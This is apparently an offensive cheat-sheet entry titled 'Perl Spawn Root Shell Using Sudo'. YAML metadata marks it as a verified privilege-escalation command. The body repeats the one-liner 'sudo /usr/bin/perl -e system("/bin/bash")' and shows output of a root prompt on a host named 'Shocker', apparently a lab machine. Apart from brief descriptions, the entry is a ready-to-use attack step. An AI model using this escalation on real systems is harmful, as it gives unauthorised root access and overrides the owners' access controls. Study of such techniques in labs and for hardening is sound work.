---
id: 9fa74a12-4c67-4e90-ba7d-6ed440e5aadf
type: command
executor: bash
data: sudo /usr/bin/perl -e 'system("/bin/bash")'
output: |-
  bob@host:/$ sudo /usr/bin/perl -e 'system("/bin/bash")'
  root@Shocker:/#
created_at: '2019-11-23T01:30:50.359949+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - shell
verified: true
validated: true
---

# Perl Spawn Root Shell Using Sudo

## Command

```bash
sudo /usr/bin/perl -e 'system("/bin/bash")'
```

## Description

Executes perl with sudo to spawn a bash shell as root.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -e | Execute perl code | Built-in |
| system("/bin/bash") | Spawn bash | Yes |

## Examples

### Basic Usage

```bash
sudo /usr/bin/perl -e 'system("/bin/bash")'
```

## Expected Output

Root shell prompt.

## Related

- [[procedures/spawn-root-shell-using-sudo-perl]]
